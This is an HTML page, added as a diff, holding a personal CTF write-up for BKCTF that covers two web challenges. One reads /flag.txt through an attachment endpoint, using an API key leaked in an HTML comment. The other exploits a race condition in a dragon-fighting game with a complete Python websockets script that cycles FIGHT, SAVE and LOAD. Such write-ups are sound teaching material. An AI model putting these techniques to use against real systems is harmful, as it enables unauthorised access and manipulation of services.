@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>BKCTF Writeup — Muhammad Afiq</title>
+  <meta name="description" content="CTF writeup for BKCTF competition. Challenges solved: My First Blog (IDOR), Be A Legend (Race Condition).">
+  <meta name="author" content="Muhammad Afiq Bin Mohd Nizam">
+  <link rel="stylesheet" href="../style.css">
+  <link rel="stylesheet" href="../writeup.css">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🚩</text></svg>">
+</head>
+<body>
+
+  <canvas id="particles-canvas"></canvas>
+
+  <!-- Navbar -->
+  <nav class="navbar scrolled" id="navbar">
+    <a href="../index.html" class="nav-logo">afiq<span>@portfolio</span>:~$</a>
+    <div class="nav-links" id="navLinks">
+      <a href="../index.html">Home</a>
+      <a href="../index.html#writeups">All Writeups</a>
+      <a href="#challenges">Challenges</a>
+    </div>
+    <button class="mobile-toggle" id="mobileToggle" aria-label="Toggle menu">
+      <span></span><span></span><span></span>
+    </button>
+  </nav>
+
+  <!-- ==================== WRITEUP HERO ==================== -->
+  <section class="writeup-hero">
+    <div class="writeup-hero-content">
+      <a href="../index.html#writeups" class="back-link">← Back to Writeups</a>
+      <div class="ctf-badge">🚩 CTF WRITEUP</div>
+      <h1 class="writeup-title">BKCTF</h1>
+      <p class="writeup-tagline">Batman's Kitchen CTF</p>
+
+      <div class="ctf-stats">
+        <div class="ctf-stat">
+          <span class="ctf-stat-value">1542</span>
+          <span class="ctf-stat-label">Points Scored</span>
+        </div>
+        <div class="ctf-stat">
+          <span class="ctf-stat-value">212<sup>nd</sup></span>
+          <span class="ctf-stat-label">Placement</span>
+        </div>
+        <div class="ctf-stat">
+          <span class="ctf-stat-value">2</span>
+          <span class="ctf-stat-label">Writeups Below</span>
+        </div>
+      </div>
+
+      <!-- Scoreboard screenshot placeholder -->
+      <div class="scoreboard-img reveal">
+        <div class="img-placeholder">
+          <span>[ BKCTF Scoreboard Screenshot ]</span>
+          <p>Replace with your actual scoreboard image</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ==================== CHALLENGES ==================== -->
+  <section id="challenges" class="challenges-section">
+    <div class="section-header">
+      <p class="section-label">// Challenges Solved</p>
+      <h2 class="section-title">Writeups</h2>
+      <p class="section-subtitle">Below are detailed writeups for some of the challenges I solved during BKCTF.</p>
+    </div>
+
+    <!-- ===== CHALLENGE 1: My First Blog ===== -->
+    <article class="challenge-block reveal" id="my-first-blog">
+      <div class="challenge-header">
+        <div class="challenge-meta-row">
+          <span class="writeup-tag tag-web">Web</span>
+          <span class="challenge-name">My First Blog</span>
+        </div>
+      </div>
+
+      <div class="challenge-body">
+        <h3 class="step-heading">📝 Overview</h3>
+        <p>This challenge presented a blog web application. The goal was to find and exploit a vulnerability to retrieve the flag.</p>
+
+        <h3 class="step-heading">🔍 Reconnaissance</h3>
+        <p>Upon visiting the web application, we're presented with a simple blog interface:</p>
+
+        <div class="screenshot-placeholder reveal">
+          <div class="img-placeholder">
+            <span>[ Blog Web Application Screenshot ]</span>
+            <p>The main page of the blog application</p>
+          </div>
+        </div>
+
+        <h3 class="step-heading">🐛 Vulnerability Discovery — IDOR</h3>
+        <p>I noticed an <strong>IDOR (Insecure Direct Object Reference)</strong> vulnerability. Navigating to <code>/blog/3</code> revealed a page that had been "deleted." Inspecting the page source code revealed some interesting HTML comments:</p>
+
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-lang">HTML</span>
+            <span class="code-file">Source: /blog/3</span>
+          </div>
+<pre><code>&lt;!-- i had to delete this bc it has my personal info on it :( --&gt;
+
+&lt;!-- for documents in the 'other' folder only people with the API key has access --&gt;
+
+&lt;object data="/attachment?file=resume.pdf&amp;apiKey=9980426e560e3661cff195b21a4493b7"</code></pre>
+        </div>
+
+        <p>Key findings from the source code:</p>
+        <ul class="finding-list">
+          <li>The blog post was deleted because it contained personal information</li>
+          <li>There's an <strong>attachment endpoint</strong> that takes a <code>file</code> parameter and an <code>apiKey</code></li>
+          <li>The API key is hardcoded: <code>9980426e560e3661cff195b21a4493b7</code></li>
+        </ul>
+
+        <h3 class="step-heading">🚀 Exploitation</h3>
+        <p>Since the <code>resume.pdf</code> file in <code>/blog/3</code> also required the API key to access, I assumed the <code>flag.txt</code> file was accessible through the same endpoint. I crafted the following URL:</p>
+
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-lang">URL</span>
+            <span class="code-file">Exploit Payload</span>
+          </div>
+<pre><code>34.186.135.240:30000/attachment?file=/flag.txt&apiKey=9980426e560e3661cff195b21a4493b7</code></pre>
+        </div>
+
+        <p>And just like that — the flag was returned! 🎉</p>
+
+        <div class="flag-box">
+          <span class="flag-label">🚩 FLAG</span>
+          <code class="flag-value">bkctf{k3ys_in_th3_l0ck5}</code>
+        </div>
+
+        <div class="takeaway-box">
+          <h4>💡 Key Takeaways</h4>
+          <ul>
+            <li>Always check page source code for hidden comments and leaked credentials</li>
+            <li>IDOR vulnerabilities can expose unintended resources through direct object references</li>
+            <li>Hardcoded API keys in HTML are a critical security issue</li>
+          </ul>
+        </div>
+      </div>
+    </article>
+
+    <!-- ===== CHALLENGE 2: Be A Legend ===== -->
+    <article class="challenge-block reveal" id="be-a-legend">
+      <div class="challenge-header">
+        <div class="challenge-meta-row">
+          <span class="writeup-tag tag-web">Web</span>
+          <span class="challenge-name">Be a Legend</span>
+        </div>
+      </div>
+
+      <div class="challenge-body">
+        <h3 class="step-heading">📝 Overview</h3>
+        <p>The challenge requires us to defeat a dragon. The dragon has <strong>1000 HP</strong> while the player only has <strong>100 HP</strong> — making it impossible to win through normal gameplay. The challenge also provides the source code.</p>
+
+        <h3 class="step-heading">🔍 Source Code Analysis</h3>
+        <p>After reviewing the source code, I spotted a vulnerability in the <code>fight_loop</code> function:</p>
+
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-lang">Python</span>
+            <span class="code-file">fight_loop function</span>
+          </div>
+<pre><code>damage = min(player.stats.atk, 50)
+dragon.stats.hp -= damage
+ws.send(f"You hit the dragon for {damage} damage. Dragon HP: {dragon.stats.hp:,}")
+
+await asyncio.sleep(0.3)  # Cool turn based combat
+
+player.stats.hp -= dragon.stats.atk
+ws.send(f"The dragon hits you for {dragon.stats.atk:,} damage. Your HP: {player.stats.hp}")</code></pre>
+        </div>
+
+        <p>The critical observation: there's a <strong>0.3 second sleep</strong> between the player's attack and the dragon's counterattack. This creates a <strong>race condition</strong> window!</p>
+
+        <h3 class="step-heading">🧠 Attack Strategy</h3>
+        <p>The exploit leverages the save/load game mechanic combined with the race condition:</p>
+
+        <div class="attack-flow">
+          <div class="flow-step">
+            <div class="flow-number">1</div>
+            <div class="flow-text">Attack the dragon (damage is applied immediately)</div>
+          </div>
+          <div class="flow-step">
+            <div class="flow-number">2</div>
+            <div class="flow-text">Save the game during the 0.3s cooldown (before dragon hits back)</div>
+          </div>
+          <div class="flow-step">
+            <div class="flow-number">3</div>
+            <div class="flow-text">Dragon kills us — but the save has our full HP with reduced dragon HP</div>
+          </div>
+          <div class="flow-step">
+            <div class="flow-number">4</div>
+            <div class="flow-text">Load the save and repeat until dragon HP reaches 0</div>
+          </div>
+        </div>
+
+        <h3 class="step-heading">🚀 Exploit Script</h3>
+        <p>I wrote a Python script using <code>websockets</code> to automate the race condition exploit:</p>
+
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-lang">Python</span>
+            <span class="code-file">exploit.py</span>
+          </div>
+<pre><code>import asyncio
+import websockets
+
+async def exploit():
+    uri = "wss://be-a-legend-2c1118e1eb6cd1d8.instancer.batmans.kitchen/ws"
+
+    async with websockets.connect(uri) as ws:
+        # Drain welcome message
+        print(await ws.recv())
+
+        async def send(cmd):
+            await ws.send(cmd)
+            print(f"&gt; {cmd}")
+
+        async def recv_all(timeout=0.5):
+            messages = []
+            try:
+                while True:
+                    msg = await asyncio.wait_for(ws.recv(), timeout=timeout)
+                    messages.append(msg)
+                    print(f"&lt; {msg}")
+                    if "bkctf{" in msg:
+                        print("\n*** FLAG FOUND ***")
+                        print(msg)
+                        return messages, True
+            except asyncio.TimeoutError:
+                pass
+            return messages, False
+
+        dragon_hp = 1000
+        cycle = 0
+
+        while dragon_hp &gt; 0:
+            cycle += 1
+            print(f"\n--- Cycle {cycle} | Dragon HP: {dragon_hp} ---")
+
+            # Start combat
+            await send("FIGHT")
+            await asyncio.sleep(0.4)
+
+            # Save with dragon's HP reduced
+            await send("SAVE")
+            await asyncio.sleep(0.8)
+
+            # Collect messages and check for flag
+            msgs, found_flag = await recv_all(timeout=0.3)
+            if found_flag:
+                break
+
+            # Parse dragon HP from messages
+            for msg in msgs:
+                if "Dragon HP:" in msg:
+                    try:
+                        hp_str = msg.split("Dragon HP:")[-1].strip().replace(",", "")
+                        dragon_hp = int(hp_str)
+                    except:
+                        pass
+
+            # Load save (resurrects player, keeps reduced dragon HP)
+            await send("LOAD")
+            await asyncio.sleep(0.3)
+            await recv_all(timeout=0.2)
+
+        print("\nExploit complete!")
+
+asyncio.run(exploit())</code></pre>
+        </div>
+
+        <p>After running the script, the dragon is defeated cycle by cycle, and we get the flag! 🎉</p>
+
+        <div class="flag-box">
+          <span class="flag-label">🚩 FLAG</span>
+          <code class="flag-value">Flag captured! (instance expired — flag not saved)</code>
+        </div>
+
+        <div class="takeaway-box">
+          <h4>💡 Key Takeaways</h4>
+          <ul>
+            <li>Race conditions in game logic can be exploited when there are time delays between state changes</li>
+            <li>The <code>asyncio.sleep()</code> call created a window where the game state could be manipulated</li>
+            <li>Save/Load mechanics combined with race conditions can bypass intended game logic</li>
+            <li>Always save your flags immediately! 😅</li>
+          </ul>
+        </div>
+      </div>
+    </article>
+
+  </section>
+
+  <!-- Footer -->
+  <footer class="footer">
+    <p>Built with <span class="heart">❤️</span> by Muhammad Afiq © 2025</p>
+  </footer>
+
+  <script src="../script.js"></script>
+</body>
+</html>
